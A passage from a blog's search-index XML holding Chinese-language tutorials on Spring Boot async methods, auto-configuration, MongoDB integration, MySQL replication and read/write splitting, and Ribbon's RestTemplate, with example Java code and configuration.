niws.loadbalancer.availabilityFilteringRule.activeConnectionsLimit = 2147483647]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>Feign</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[异步调用]]></title>
    <url>%2F2019%2F03%2F13%2F%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8%2F</url>
    <content type="text"><![CDATA[通常我们开发的程序都是同步调用的，即程序按照代码的顺序一行一行的逐步往下执行，每一行代码都必须等待上一行代码执行完毕才能开始执行。而异步编程则没有这个限制，代码的调用不再是阻塞的。所以在一些情景下，通过异步编程可以提高效率，提升接口的吞吐量。这节将介绍如何在Spring Boot中进行异步编程。 开启异步新建一个Spring Boot项目，版本为2.1.0.RELEASE，并引入spring-boot-starter-web依赖，项目结构如下所示： 要开启异步支持，首先得在Spring Boot入口类上加上@EnableAsync注解： 1234567@SpringBootApplication@EnableAsyncpublic class DemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(DemoApplication.class, args); &#125;&#125; 接下来开始编写异步方法。 在com.example.demo路径下新建service包，并创建TestService： 1234567891011121314151617181920212223@Servicepublic class TestService &#123; private Logger logger = LoggerFactory.getLogger(this.getClass()); @Async public void asyncMethod() &#123; sleep(); logger.info(&quot;异步方法内部线程名称：&#123;&#125;&quot;, Thread.currentThread().getName()); &#125; public void syncMethod() &#123; sleep(); &#125; private void sleep() &#123; try &#123; TimeUnit.SECONDS.sleep(2); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 上面的Service中包含一个异步方法asyncMethod（开启异步支持后，只需要在方法上加上@Async注解便是异步方法了）和同步方法syncMethod。sleep方法用于让当前线程阻塞2秒钟。 接着在com.example.demo路径下新建controller包，然后创建TestController： 1234567891011121314151617181920212223242526272829303132@RestControllerpublic class TestController &#123; private Logger logger = LoggerFactory.getLogger(this.getClass()); @Autowired private TestService testService; @GetMapping(&quot;async&quot;) public void testAsync() &#123; long start = System.currentTimeMillis(); logger.info(&quot;异步方法开始&quot;); testService.asyncMethod(); logger.info(&quot;异步方法结束&quot;); long end = System.currentTimeMillis(); logger.info(&quot;总耗时：&#123;&#125; ms&quot;, end - start); &#125; @GetMapping(&quot;sync&quot;) public void testSync() &#123; long start = System.currentTimeMillis(); logger.info(&quot;同步方法开始&quot;); testService.syncMethod(); logger.info(&quot;同步方法结束&quot;); long end = System.currentTimeMillis(); logger.info(&quot;总耗时：&#123;&#125; ms&quot;, end - start); &#125;&#125; 启动项目，访问 http://localhost:8080/sync 请求，控制台输出如下： 可看到默认程序是同步的，由于sleep方法阻塞的原因，testSync方法执行了2秒钟以上。 访问 http://localhost:8080/async ，控制台输出如下： 可看到testAsync方法耗时极少，因为异步的原因，程序并没有被sleep方法阻塞，这就是异步调用的好处。同时异步方法内部会新启一个线程来执行，这里线程名称为task - 1。 默认情况下的异步线程池配置使得线程不能被重用，每次调用异步方法都会新建一个线程，我们可以自己定义异步线程池来优化。 自定义异步线程池在com.example.demo下新建config包，然后创建AsyncPoolConfig配置类： 1234567891011121314151617181920@Configurationpublic class AsyncPoolConfig &#123; @Bean public ThreadPoolTaskExecutor asyncThreadPoolTaskExecutor()&#123; ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor(); executor.setCorePoolSize(20); executor.setMaxPoolSize(200); executor.setQueueCapacity(25); executor.setKeepAliveSeconds(200); executor.setThreadNamePrefix(&quot;asyncThread&quot;); executor.setWaitForTasksToCompleteOnShutdown(true); executor.setAwaitTerminationSeconds(60); executor.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy()); executor.initialize(); return executor; &#125;&#125; 上面我们通过ThreadPoolTaskExecutor的一些方法自定义了一个线程池，这些方法的含义如下所示： corePoolSize：线程池核心线程的数量，默认值为1（这就是默认情况下的异步线程池配置使得线程不能被重用的原因）。 maxPoolSize：线程池维护的线程的最大数量，只有当核心线程都被用完并且缓冲队列满后，才会开始申超过请核心线程数的线程，默认值为Integer.MAX_VALUE。 queueCapacity：缓冲队列。 keepAliveSeconds：超出核心线程数外的线程在空闲时候的最大存活时间，默认为60秒。 threadNamePrefix：线程名前缀。 waitForTasksToCompleteOnShutdown：是否等待所有线程执行完毕才关闭线程池，默认值为false。 awaitTerminationSeconds：waitForTasksToCompleteOnShutdown的等待的时长，默认值为0，即不等待。 rejectedExecutionHandler：当没有线程可以被使用时的处理策略（拒绝任务），默认策略为abortPolicy，包含下面四种策略： callerRunsPolicy：用于被拒绝任务的处理程序，它直接在 execute 方法的调用线程中运行被拒绝的任务；如果执行程序已关闭，则会丢弃该任务。 abortPolicy：直接抛出java.util.concurrent.RejectedExecutionException异常。 discardOldestPolicy：当线程池中的数量等于最大线程数时、抛弃线程池中最后一个要执行的任务，并执行新传入的任务。 discardPolicy：当线程池中的数量等于最大线程数时，不做任何动作。 要使用该线程池，只需要在@Async注解上指定线程池Bean名称即可： 12345678910@Servicepublic class TestService &#123; ...... @Async(&quot;asyncThreadPoolTaskExecutor&quot;) public void asyncMethod() &#123; ...... &#125; ......&#125; 重启项目，再次访问 http://localhost:8080/async ，控制台输出入下： 处理异步回调如果异步方法具有返回值的话，需要使用Future来接收回调值。我们修改TestService的asyncMethod方法，给其添加返回值： 123456@Async(&quot;asyncThreadPoolTaskExecutor&quot;)public Future&lt;String&gt; asyncMethod() &#123; sleep(); logger.info(&quot;异步方法内部线程名称：&#123;&#125;&quot;, Thread.currentThread().getName()); return new AsyncResult&lt;&gt;(&quot;hello async&quot;);&#125; 泛型指定返回值的类型，AsyncResult为Spring实现的Future实现类： 接着改造TestController的testAsync方法： 123456789101112131415@GetMapping(&quot;async&quot;)public String testAsync() throws Exception &#123; long start = System.currentTimeMillis(); logger.info(&quot;异步方法开始&quot;); Future&lt;String&gt; stringFuture = testService.asyncMethod(); String result = stringFuture.get(); logger.info(&quot;异步方法返回值：&#123;&#125;&quot;, result); logger.info(&quot;异步方法结束&quot;); long end = System.currentTimeMillis(); logger.info(&quot;总耗时：&#123;&#125; ms&quot;, end - start); return stringFuture.get();&#125; Future接口的get方法用于获取异步调用的返回值。 重启项目，访问 http://localhost:8080/async 控制台输出如下所示: 通过返回结果我们可以看出Future的get方法为阻塞方法，只有当异步方法返回内容了，程序才会继续往下执行。get还有一个get(long timeout, TimeUnit unit)重载方法，我们可以通过这个重载方法设置超时时间，即异步方法在设定时间内没有返回值的话，直接抛出java.util.concurrent.TimeoutException异常。 比如设置超时时间为60秒： 1String result = stringFuture.get(60, TimeUnit.SECONDS);]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>异步</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自动装配]]></title>
    <url>%2F2019%2F03%2F13%2F%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%2F</url>
    <content type="text"><![CDATA[模式注解Stereotype Annotation俗称为模式注解，Spring中常见的模式注解有@Service，@Repository，@Controller等，它们都“派生”自@Component注解。我们都知道，凡是被@Component标注的类都会被Spring扫描并纳入到IOC容器中，那么由@Component派生的注解所标注的类也会被扫描到IOC容器中。下面我们主要来通过自定义模式注解来了解@Component的“派生性”和“层次性”。 @Component “派生性”新建一个Spring Boot工程，Spring Boot版本为2.1.0.RELEASE，artifactId为autoconfig，并引入spring-boot-starter-web依赖。项目结构如下所示: 在com.example.demo下新建annotation包，然后创建一个FirstLevelService注解： 1234567@Target(&#123;ElementType.TYPE&#125;)@Retention(RetentionPolicy.RUNTIME)@Documented@Servicepublic @interface FirstLevelService &#123; String value() default &quot;&quot;;&#125; 这个注解定义由@Service标注，查看@Service的源码会发现其被@Component注解标注，所以它们的层次关系为: 123└─@Component └─@Service └─@FirstLevelService 即@FirstLevelService为@Component派生出来的模式注解，我们来测试一下被它标注的类是否能够被扫描到IOC容器中： 在com.example.demo下新建service包，然后创建一个TestService类： 123@SecondLevelServicepublic class TestService &#123;&#125; 在com.example.demo下新建bootstrap包，然后创建一个ServiceBootStrap类，用于测试注册TestService并从IOC容器中获取它： 123456789101112@ComponentScan(&quot;com.example.demo.service&quot;)public class ServiceBootstrap &#123; public static void main(String[] args) &#123; ConfigurableApplicationContext context = new SpringApplicationBuilder(ServiceBootstrap.class) .web(WebApplicationType.NONE) .run(args); TestService testService = context.getBean(&quot;testService&quot;, TestService.class); System.out.println(&quot;TestService Bean: &quot; + testService); context.close(); &#125;&#125; 运行该类的main方法，控制台输出如下： @Component “层次性”我们在com.example.demo.annotation路径下再创建一个SecondLevelService注解定义，该注解由上面的@FirstLevelService标注： 1234567@Target(&#123;ElementType.TYPE&#125;)@Retention(RetentionPolicy.RUNTIME)@Documented@FirstLevelServicepublic @interface SecondLevelService &#123; String value() default &quot;&quot;;&#125; 这时候层次关系为： 1234└─@Component └─@Service └─@FirstLevelService └─@SecondLevelService 我们将TestService上的注解换成@SecondLevelService，然后再次运行ServiceBootStrap的main方法，输出如下： 可见结果也是成功的。 这里有一点需要注意的是：@Component注解只包含一个value属性定义，所以其“派生”的注解也只能包含一个vlaue属性定义。 @Enable模块驱动@Enable模块驱动在Spring Framework 3.1后开始支持。这里的模块通俗的来说就是一些为了实现某个功能的组件的集合。通过@Enable模块驱动，我们可以开启相应的模块功能。 @Enable模块驱动可以分为“注解驱动”和“接口编程”两种实现方式，下面逐一进行演示： 注解驱动Spring中，基于注解驱动的示例可以查看@EnableWebMvc源码： 123456@Retention(RetentionPolicy.RUNTIME)@Target(&#123;ElementType.TYPE&#125;)@Documented@Import(&#123;DelegatingWebMvcConfiguration.class&#125;)public @interface EnableWebMvc &#123;&#125; 该注解通过@Import导入一个配置类DelegatingWebMvcConfiguration： 该配置类又继承自WebMvcConfigurationSupport，里面定义了一些Bean的声明。 所以，基于注解驱动的@Enable模块驱动其实就是通过@Import来导入一个配置类，以此实现相应模块的组件注册，当这些组件注册到IOC容器中，这个模块对应的功能也就可以使用了。 我们来定义一个基于注解驱动的@Enable模块驱动。 在com.example.demo下新建configuration包，然后创建一个HelloWorldConfiguration配置类： 12345678@Configurationpublic class HelloWorldConfiguration &#123; @Bean public String hello() &#123; return &quot;hello world&quot;; &#125;&#125; 这个配置类里定义了一个名为hello的Bean，内容为hello world。 在com.example.demo.annotation下创建一个EnableHelloWorld注解定义： 123456@Target(&#123;ElementType.TYPE&#125;)@Retention(RetentionPolicy.RUNTIME)@Documented@Import(HelloWorldConfiguration.class)public @interface EnableHelloWorld &#123;&#125; 我们在该注解类上通过@Import导入了刚刚创建的配置类。 接着在com.example.demo.bootstrap下创建一个TestEnableBootstap启动类来测试@EnableHelloWorld注解是否生效： 1234567891011@EnableHelloWorldpublic class TestEnableBootstap &#123; public static void main(String[] args) &#123; ConfigurableApplicationContext context = new SpringApplicationBuilder(TestEnableBootstap.class) .web(WebApplicationType.NONE) .run(args); String hello = context.getBean(&quot;hello&quot;, String.class); System.out.println(&quot;hello Bean: &quot; + hello); context.close(); &#125;&#125; 运行该类的main方法，控制台输出如下： 说明我们自定义的基于注解驱动的@EnableHelloWorld是可行的。 接口编程除了使用上面这个方式外，我们还可以通过接口编程的方式来实现@Enable模块驱动。Spring中，基于接口编程方式的有@EnableCaching注解，查看其源码： 1234567891011@Target(&#123;ElementType.TYPE&#125;)@Retention(RetentionPolicy.RUNTIME)@Documented@Import(&#123;CachingConfigurationSelector.class&#125;)public @interface EnableCaching &#123; boolean proxyTargetClass() default false; AdviceMode mode() default AdviceMode.PROXY; int order() default 2147483647;&#125; EnableCaching注解通过@Import导入了CachingConfigurationSelector类，该类间接实现了ImportSelector接口。 通过接口编程实现@Enable模块驱动的本质是：通过@Import来导入接口ImportSelector实现类，该实现类里可以定义需要注册到IOC容器中的组件，以此实现相应模块对应组件的注册。 接下来我们根据这个思路来自个实现一遍： 在com.example.demo下新建selector包，然后在该路径下新建一个HelloWorldImportSelector实现ImportSelector接口： 123456public class HelloWorldImportSelector implements ImportSelector &#123; @Override public String[] selectImports(AnnotationMetadata importingClassMetadata) &#123; return new String[]&#123;HelloWorldConfiguration.class.getName()&#125;; &#125;&#125; 接着我们修改EnableHelloWorld： 123456@Target(&#123;ElementType.TYPE&#125;)@Retention(RetentionPolicy.RUNTIME)@Documented@Import(HelloWorldImportSelector.class)public @interface EnableHelloWorld &#123;&#125; 上面导入的是HelloWorldImportSelector，而非HelloWorldConfiguration。 再次运行TestEnableBootstap的main方法，你会发现输出是一样的。 自动装配Spring Boot中的自动装配技术底层主要用到了下面这些技术: Spring 模式注解装配 Spring @Enable 模块装配 Spring 条件装配装 Spring 工厂加载机制 Spring 工厂加载机制的实现类为SpringFactoriesLoader，查看其源码： 该类的方法会读取META-INF目录下的spring.factories配置文件，我们查看spring-boot-autoconfigure-2.1.0.RELEASE.jar下的该文件： 当启动类被@EnableAutoConfiguration标注后，上面截图中的所有类Spring都会去扫描，看是否可以纳入到IOC容器中进行管理。 比如我们查看org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration的源码： 可看到该类上标注了一些注解，其中@Configuration为模式注解，@EnableConfigurationProperties为模块装配技术，ConditionalOnClass为条件装配技术。这和我们上面列出的Spring Boot自动装配底层主要技术一致，所以我们可以根据这个思路来自定义一个自动装配实现。 新建一个配置类HelloWorldAutoConfiguration： 12345@Configuration@EnableHelloWorld@ConditionalOnProperty(name = &quot;helloworld&quot;, havingValue = &quot;true&quot;)public class HelloWorldAutoConfiguration &#123;&#125; 然后在resources目录下新建META-INF目录，并创建spring.factories文件： 123# Auto Configureorg.springframework.boot.autoconfigure.EnableAutoConfiguration=\com.example.demo.configuration.HelloWorldAutoConfiguration 接着在配置文件application.properties中添加helloworld=true配置 1helloworld=true 最后创建EnableAutoConfigurationBootstrap，测试下HelloWorldAutoConfiguration是否生效： 123456789101112@EnableAutoConfigurationpublic class EnableAutoConfigurationBootstrap &#123; public static void main(String[] args) &#123; ConfigurableApplicationContext context = new SpringApplicationBuilder(EnableAutoConfigurationBootstrap.class) .web(WebApplicationType.NONE) .run(args); String hello = context.getBean(&quot;hello&quot;, String.class); System.out.println(&quot;hello Bean: &quot; + hello); context.close(); &#125;&#125; 运行该main方法，控制台输出如下： 说明我们自定义的自动装配已经成功了。 下面简要分析下代码的运行逻辑： Spring 的工厂加载机制会自动读取META-INF目录下spring.factories文件内容； 我们在spring.factories定义了： 12org.springframework.boot.autoconfigure.EnableAutoConfiguration=\com.example.demo.configuration.HelloWorldAutoConfiguration 我们在测试类上使用了@EnableAutoConfiguration注解标注，那么HelloWorldAutoConfiguration就会被Spring扫描，看是否符合要求，如果符合则纳入到IOC容器中； HelloWorldAutoConfiguration上的@ConditionalOnProperty的注解作用为：当配置文件中配置了helloworld=true（我们确实添加了这个配置，所以符合要求）则这个类符合扫描规则；@EnableHelloWorld注解是我们前面例子中自定义的模块驱动注解，其引入了hello这个Bean，所以IOC容器中便会存在hello这个Bean了； 通过上面的步骤，我们就可以通过上下文获取到hello这个Bean了。]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>自动装配</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springboot整合MongoDB]]></title>
    <url>%2F2019%2F03%2F11%2FSpringboot%E6%95%B4%E5%90%88MongoDB%2F</url>
    <content type="text"><![CDATA[这节我们将整合Spring Boot与Mongo DB实现增删改查的功能，并且实现序列递增。Mongo DB下载地址：https://www.mongodb.com/download-center/community。 新建一个Spring Boot项目，版本为2.1.3.RELEASE，并引入如下依赖： 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-mongodb&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt; 然后可以通过Mongo Shell或者Mongo Compass工具创建一个名称为testdb的数据库，并新增user文档（文档，类似与关系型数据库里的数据表）： 在配置文件application.yml里配置Mongo DB： 123456spring: data: mongodb: host: localhost port: 27017 database: testdb Mongo DB的默认端口为27017，使用的数据库为刚刚创建的testdb。 创建User实体类： 1234567891011121314@Document(collection = &quot;user&quot;)public class User &#123; @Id private String id; private String name; private Integer age; private String description; // get set 略&#125; @Document(collection = &quot;user&quot;)表明这是一个文档对象，名称为user，对应Mongo DB里的user表。@Id标注主键字段，String类型的主键值在插入的时候Mongo DB会帮我们自动生成。如果对象中的某个属性为非表字段，可以使用注解@Transient进行排除。 准备好这些后，我们开始编写一些简单的增删改查样例。 简单增删改查创建一个UserDao接口： 123@Repositorypublic interface UserDao extends MongoRepository&lt;User, String&gt; &#123;&#125; 接口继承自MongoRepository，泛型分别为实体对象和主键类型。通过继承MongoRepository，UserDao包含了一些增删改查的方法，如下图所示： 接着编写UserService，为了方便这里不再编写接口： 12345678910111213141516171819202122232425262728293031323334353637383940@Servicepublic class UserService &#123; @Autowired private UserDao userDao; public List&lt;User&gt; getUsers() &#123; return userDao.findAll(); &#125; public Optional&lt;User&gt; getUser(String id) &#123; return this.userDao.findById(id); &#125; /** * 新增和修改都是 save方法， * id 存在为修改，id 不存在为新增 */ public User createUser(User user) &#123; user.setId(null); return userDao.save(user); &#125; public void deleteUser(String id) &#123; this.userDao.findById(id) .ifPresent(user -&gt; this.userDao.delete(user)); &#125; public void updateUser(String id, User user) &#123; this.userDao.findById(id) .ifPresent( u -&gt; &#123; u.setName(user.getName()); u.setAge(user.getAge()); u.setDescription(user.getDescription()); this.userDao.save(u); &#125; ); &#125;&#125; 上面我们编写了基本的增删改查样例，新增和修改都是通过save方法完成的，当主键存在时则为修改，主键不存在则为新增。 最后编写一个RESTful的UserController（为了方便，没有对参数进行校验）： 123456789101112131415161718192021222324252627282930313233343536@RestController@RequestMapping(&quot;user&quot;)public class UserController &#123; @Autowired private UserService userService; @GetMapping public List&lt;User&gt; getUsers() &#123; return userService.getUsers(); &#125; @PostMapping public User createUser(User user) &#123; return userService.createUser(user); &#125; @DeleteMapping(&quot;/&#123;id&#125;&quot;) public void deleteUser(@PathVariable String id) &#123; userService.deleteUser(id); &#125; @PutMapping(&quot;/&#123;id&#125;&quot;) public void updateUser(@PathVariable String id, User user) &#123; userService.updateUser(id, user); &#125; /** * 根据用户 id查找 * 存在返回，不存在返回 null */ @GetMapping(&quot;/&#123;id&#125;&quot;) public User getUser(@PathVariable String id) &#123; return userService.getUser(id).orElse(null); &#125;&#125; 启动项目，使用postman来测试接口的可用性。 测试新增用户： 新增成功，查看数据库： 测试查询用户： 查询成功。 测试通过用ID查找用户： 更新用户： 查看数据库是否更新成功： 更新成功。 最后测试通过用户ID删除用户： 返回状态码200，删除成功。 查看数据库，删除成功： 多条件查询其实UserDao通过继承MongoRepository已经具有了JPA的特性，我们可以通过方法名来构建多查询条件的SQL。比如通过用户的年龄段来查询： 123456789101112@Repositorypublic interface UserDao extends MongoRepository&lt;User, String&gt; &#123; /** * 根据年龄段来查找 * * @param from from * @param to to * @return List&lt;User&gt; */ List&lt;User&gt; findByAgeBetween(Integer from, Integer to);&#125; 在输入findBy后，IDEA会根据实体对象的属性和SQL的各种关键字自动组合提示： 比如再在创建一个通过年龄段，用户名和描述（模糊查询）查询用户的方法： 12345678910/** * 通过年龄段，用户名，描述（模糊查询） * * @param from from * @param to to * @param name name * @param description description * @return List&lt;User&gt; */List&lt;User&gt; findByAgeBetweenAndNameEqualsAndDescriptionIsLike(Integer from, Integer to, String name, String description); 方法参数个数需要和方法名中所需要的参数个数对应上。 排序与分页排序和分页需要使用MongoTemplate对象来完成，在UserService里新增一个getUserByCondition方法： 12345678910111213141516171819202122@Autowiredprivate MongoTemplate template;public Page&lt;User&gt; getUserByCondition(int size, int page, User user) &#123; Query query = new Query(); Criteria criteria = new Criteria(); if (!StringUtils.isEmpty(user.getName())) &#123; criteria.and(&quot;name&quot;).is(user.getName()); &#125; if (!StringUtils.isEmpty(user.getDescription())) &#123; criteria.and(&quot;description&quot;).regex(user.getDescription()); &#125; query.addCriteria(criteria); Sort sort = new Sort(Sort.Direction.DESC, &quot;age&quot;); Pageable pageable = PageRequest.of(page, size, sort); List&lt;User&gt; users = template.find(query.with(pageable), User.class); return PageableExecutionUtils.getPage(users, pageable, () -&gt; template.count(query, User.class));&#125; size表示每页显示的条数，page表示当前页码数，0表示第一页。上面的方法通过name和description（模糊查询）来查询用户分页信息，并且查询结果使用age字段降序排序。方法返回Page对象。 在UserController里添加： 1234@GetMapping(&quot;/condition&quot;)public Page&lt;User&gt; getUserByCondition(int size, int page, User user) &#123; return userService.getUserByCondition(size, page, user);&#125; 重启项目，我们往数据库里多加几条数据： 获取第1页数据，每页显示10条： 返回数据： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&#123; &quot;content&quot;: [ &#123; &quot;id&quot;: &quot;5ca56ae2f08f0b6048fd470d&quot;, &quot;name&quot;: &quot;jane&quot;, &quot;age&quot;: 26, &quot;description&quot;: &quot;web developer&quot; &#125;, &#123; &quot;id&quot;: &quot;5ca56ad1f08f0b6048fd470c&quot;, &quot;name&quot;: &quot;scott&quot;, &quot;age&quot;: 23, &quot;description&quot;: &quot;ui designer&quot; &#125;, &#123; &quot;id&quot;: &quot;5ca56afaf08f0b6048fd470e&quot;, &quot;name&quot;: &quot;mike&quot;, &quot;age&quot;: 21, &quot;description&quot;: &quot;python developer&quot; &#125;, &#123; &quot;id&quot;: &quot;5ca56b38f08f0b6048fd470f&quot;, &quot;name&quot;: &quot;mrbird&quot;, &quot;age&quot;: 18, &quot;description&quot;: &quot;java noob&quot; &#125; ], &quot;pageable&quot;: &#123; &quot;sort&quot;: &#123; &quot;sorted&quot;: true, &quot;unsorted&quot;: false, &quot;empty&quot;: false &#125;, &quot;offset&quot;: 0, &quot;pageSize&quot;: 10, &quot;pageNumber&quot;: 0, &quot;unpaged&quot;: false, &quot;paged&quot;: true &#125;, &quot;last&quot;: true, &quot;totalPages&quot;: 1, &quot;totalElements&quot;: 4, &quot;number&quot;: 0, &quot;size&quot;: 10, &quot;sort&quot;: &#123; &quot;sorted&quot;: true, &quot;unsorted&quot;: false, &quot;empty&quot;: false &#125;, &quot;numberOfElements&quot;: 4, &quot;first&quot;: true, &quot;empty&quot;: false&#125;]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[主从复制和读写分离]]></title>
    <url>%2F2019%2F03%2F11%2F%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%92%8C%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB%2F</url>
    <content type="text"><![CDATA[主从复制主要涉及三个线程：binlog 线程、I/O 线程和 SQL 线程。 binlog 线程 ：负责将主服务器上的数据更改写入二进制日志（Binary log）中。 I/O 线程 ：负责从主服务器上读取二进制日志，并写入从服务器的中继日志（Relay log）。 SQL 线程 ：负责读取中继日志，解析出主服务器已经执行的数据更改并在从服务器中执行。 读写分离主服务器处理写操作以及实时性要求比较高的读操作，而从服务器处理读操作。 读写分离能提高性能的原因在于： 主从服务器负责各自的读和写，极大程度缓解了锁的争用； 从服务器可以使用 MyISAM，提升查询性能以及节约系统开销； 增加冗余，提高可用性。 读写分离常用代理方式来实现，代理服务器接收应用层传来的读写请求，然后决定转发到哪个服务器。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>读写分离</tag>
        <tag>主从复制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ribbon]]></title>
    <url>%2F2019%2F03%2F11%2FRibbon%2F</url>
    <content type="text"><![CDATA[为了提高服务的可用性，我们一般会将相同的服务部署多个实例，负载均衡的作用就是使获取服务的请求被均衡的分配到各个实例中。负载均衡一般分为服务端负载均衡和客户端负载均衡，服务端的负载均衡通过硬件（如F5）或者软件（如Nginx）来实现，而Ribbon实现的是客户端负载均衡。服务端负载均衡是在硬件设备或者软件模块中维护一份可用服务清单，然后客户端发送服务请求到这些负载均衡的设备上，这些设备根据一些算法均衡的将请求转发出去。而客户端负载均衡则是客户端自己从服务注册中心（如之前提到的Eureka Server）中获取服务清单缓存到本地，然后通过Ribbon内部算法均衡的去访问这些服务。 Ribbon简介Ribbon是由Netflix开发的一款基于HTTP和TCP的负载均衡的开源软件。我们可以直接给Ribbon配置好服务列表清单，也可以配合Eureka主动的去获取服务清单，需要使用到这些服务的时候Ribbon通过轮询或者随机等均衡算法去获取服务。 在Spring Cloud Eureka服务治理一节中，我们已经在Server-Consumer中配置了Ribbon，并通过加了@LoadBalanced注解的RestTemplate对象去均衡的消费服务，所以这节主要记录的是RestTemplate的详细使用方法和一些额外的Ribbon配置。 RestTemplate详解从名称上来看就可以知道它是一个用来发送REST请求的摸板，所以包含了GET,POST,PUT,DELETE等HTTP Method对应的方法。 发送Get请求RestTemplate中与GET请求对应的方法有getForEntity和getForObject。 getForEntity getForEntity方法返回ResponseEntity对象，该对象包含了返回报文头，报文体和状态码等信息。getForEntity有三个重载方法： getForEntity(String url, Class&lt;T&gt; responseType, Object... uriVariables)； getForEntity(String url, Class&lt;T&gt; responseType, Map&lt;String, ?&gt; uriVariables)； getForEntity(URI url, Class&lt;T&gt; responseType)； 第一个参数为Url，第二个参数为返回值的类型，第三个参数为请求的参数（可以是数组，也可以是Map）。 举个getForEntity(String url, Class&lt;T&gt; responseType, Object... uriVariables)的使用例子： 1234@GetMapping(&quot;user/&#123;id:\\d+&#125;&quot;)public User getUser(@PathVariable Long id) &#123; return this.restTemplate.getForEntity(&quot;http://Server-Provider/user/&#123;name&#125;&quot;, User.class, id).getBody();&#125; {1}为参数的占位符，匹配参数数组的第一个元素。因为第二个参数指定了类型为User，所以调用getBody方法返回类型也为User。 方法参数除了可以放在数组里外，也可以放在Map里，举个getForEntity(String url, Class&lt;T&gt; responseType, Map&lt;String, ?&gt; uriVariables)使用例子： 123456@GetMapping(&quot;user/&#123;id:\\d+&#125;&quot;)public User getUser(@PathVariable Long id) &#123; Map&lt;String, Object&gt; params = new HashMap&lt;&gt;(); params.put(&quot;id&quot;, id); return this.restTemplate.getForEntity(&quot;http://Server-Provider/user/&#123;id&#125;&quot;, User.class, params).getBody();&#125; 只有两个参数的重载方法getForEntity(URI url, Class&lt;T&gt; responseType)第一个参数接收java.net.URI类型，可以通过org.springframework.web.util.UriComponentsBuilder来创建，举个该方法的使用例子： 12345678@GetMapping(&quot;user/&#123;id:\\d+&#125;&quot;)public User getUser(@PathVariable Long id) &#123; Map&lt;String, Object&gt; params = new HashMap&lt;&gt;(); params.put(&quot;id&quot;, id); URI uri = UriComponentsBuilder.fromUriString(&quot;http://Server-Provider/user/&#123;id&#125;&quot;) .build().expand(params).encode().toUri(); return this.restTemplate.getForEntity(uri, User.class).getBody();&#125; 其中expand方法也可以接收数组和Map两种类型的参数。 getForObject getForObject方法和getForEntity方法类似，getForObject方法相当于getForEntity方法调用了getBody方法，直接返回结果对象，为不是ResponseEntity对象。 getForObject方法和getForEntity方法一样，也有三个重载方法，参数类型和getForEntity方法一致，所以不再列出。 发送POST请求使用RestTemplate发送POST请求主要有postForEntity，postForObject和postForLocation（这个目前较少使用，所以不做介绍）三个方法。 postForEntity和postForObject也分别有三个重载方法，方法参数和使用方式和上面介绍的getForEntity和getForObject一样，所以不再详细介绍。简单举个getForObject的使用例子： 1234 @GetMapping(&quot;user&quot;)public List&lt;User&gt; getUsers() &#123; return this.restTemplate.getForObject(&quot;http://Server-Provider/user&quot;, List.class);&#125; 发送PUT请求使用RestTemplate发送PUT请求，使用的是它的put方法，put方法返回值是void类型，该方法也有三个重载方法： put(String url, Object request, Object... uriVariables)； put(String url, Object request, Map&lt;String, ?&gt; uriVariables)； put(URI url, Object request)。 举个例子： 12345@GetMapping(&quot;user/update&quot;)public void updateUser() throws JsonProcessingException &#123; User user = new User(1L, &quot;mrbird&quot;, &quot;123456&quot;); this.restTemplate.put(&quot;http://Server-Provider/user&quot;, user);&#125; 在RESTful风格的接口中，判断成功失败不再是通过返回值的某个标识来判断的，而是通过返回报文的状态码是否为200来判断。当这个方法成功执行并返回时，返回报文状态为200，即可判断方法执行成功。 发送DELETE请求使用RestTemplate发送DELETE请求，使用的是它的delete方法，delete方法返回值是void类型，该方法也有三个重载方法： delete(String url, Object... uriVariables)； delete(String url, Map&lt;String, ?&gt; uriVariables); delete(URI url)。 举个例子： 1234@GetMapping(&quot;user/delete/&#123;id:\\d+&#125;&quot;)public void deleteUser(@PathVariable Long id) &#123; this.restTemplate.delete(&quot;http://Server-Provider/user/&#123;1&#125;&quot;, id);&#125; RestTemplates实战我们在Spring Cloud Eureka服务治理中的Eureka客户端（Server-Provider）中编写一套RESTful风格的测试接口： 1234567891011121314151617181920212223242526272829303132333435@RestController@RequestMapping(&quot;user&quot;)public class UserController &#123; private Logger log = LoggerFactory.getLogger(this.getClass()); @GetMapping(&quot;/&#123;id:\\d+&#125;&quot;) public User get(@PathVariable Long id) &#123; log.info(&quot;获取用户id为 &quot; + id + &quot;的信息&quot;); return new User(id, &quot;mrbird&quot;, &quot;123456&quot;); &#125; @GetMapping public List&lt;User&gt; get() &#123; List&lt;User&gt; list = new ArrayList&lt;&gt;(); list.add(new User(1L, &quot;mrbird&quot;, &quot;123456&quot;)); list.add(new User(2L, &quot;scott&quot;, &quot;123456&quot;)); log.info(&quot;获取用户信息 &quot; + list); return list; &#125; @PostMapping public void add(@RequestBody User user) &#123; log.info(&quot;新增用户成功 &quot; + user); &#125; @PutMapping public void update(@RequestBody User user) &#123; log.info(&quot;更新用户成功 &quot; + user); &#125; @DeleteMapping(&quot;/&#123;id:\\d+&#125;&quot;) public void delete(@PathVariable Long id) &#123; log.info(&quot;删除用户成功 &quot; + id); &#125;&#125; 